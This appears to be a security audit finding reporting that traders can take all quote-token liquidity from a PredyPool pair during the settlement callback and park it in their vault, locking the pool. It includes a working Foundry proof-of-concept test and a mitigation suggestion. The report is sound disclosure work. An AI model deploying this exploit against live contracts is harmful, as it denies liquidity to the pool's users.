# Vulnerability details

## Summary

Traders can lock all liquidity in a pool.

## Vulnerability Details

In `predySettlementCallback()` traders can `take()` everything from quote token pool as long as they return these assets in `predyTradeAfterCallback()`. 

End result is that all assets from quote token pool move to trader's vault. No funds can actually be stolen from `PredyPool` this way, however this locks all available liquidity in a pool. 

## Proof of Concept

```
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "../pool/Setup.t.sol";

contract TestLockPool is TestPool {
    uint256 pairId;
    uint256 constant POOL_AMOUNT = 1e9;
    uint256 constant MIN_MARGIN = 1e9;

    function setUp() public override {
        TestPool.setUp();
        pairId = registerPair(address(currency1), address(0), false);
        predyPool.supply(pairId, true, POOL_AMOUNT);
    }

    function predySettlementCallback(
        address quoteToken,
        address baseToken,
        bytes memory settlementData,
        int256 baseAmountDelta
    ) external {
        ERC20(currency0).transfer(address(predyPool), uint256(-baseAmountDelta));
        // Drain the pool.
        predyPool.take(true, address(this), POOL_AMOUNT);
    }

    function predyTradeAfterCallback(IPredyPool.TradeParams memory params, IPredyPool.TradeResult memory) external {
        // Move the all pool assets to our vault.
        ERC20(currency1).transfer(address(predyPool), POOL_AMOUNT + MIN_MARGIN);
    }

    function testLockPool() public {
        // Drain quote token pool and send it as collateral the vault.
        IPredyPool.TradeParams memory tradeParams = IPredyPool.TradeParams(pairId, 0, 1, 0, bytes("0x"));
        predyPool.trade(tradeParams, bytes("0x"));

        // No more liquidity in the pool.
        vm.expectRevert();
        tradeParams = IPredyPool.TradeParams(pairId, 0, 1, 0, bytes("0x"));
        predyPool.trade(tradeParams, bytes("0x"));
    }
}
```

## Recommended Mitigation Steps

After `PredyPool` calls `predySettlementCallback()`, it should check that excessive amounts of quote token weren't taken.
